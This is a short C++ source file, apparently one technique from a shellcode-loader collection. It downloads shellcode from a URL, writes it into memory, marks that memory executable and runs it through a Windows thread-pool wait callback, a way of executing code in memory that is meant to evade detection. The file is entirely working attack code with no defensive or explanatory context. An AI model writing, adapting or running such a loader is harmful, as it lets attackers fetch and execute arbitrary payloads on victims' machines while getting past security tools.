#include "..\..\Public.hpp"

void runShellcode()
{
	std::string shellcode = GetShellcodeFromUrl();

	if (shellcode.size() > 0)
	{
		DWORD oldProtect;
		LPVOID Memory = VirtualAlloc(NULL, shellcode.size(), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
		mc(Memory, shellcode.c_str(), shellcode.size());
		VirtualProtect(Memory, shellcode.size(), PAGE_EXECUTE_READ, &oldProtect);

		HANDLE event = CreateEvent(NULL, FALSE, TRUE, NULL);
		PTP_WAIT threadPoolWait = CreateThreadpoolWait((PTP_WAIT_CALLBACK)Memory, NULL, NULL);
		SetThreadpoolWait(threadPoolWait, event, NULL);
		WaitForSingleObject(event, INFINITE);
	}
}

int main()
{
	runShellcode();
	return 0;
}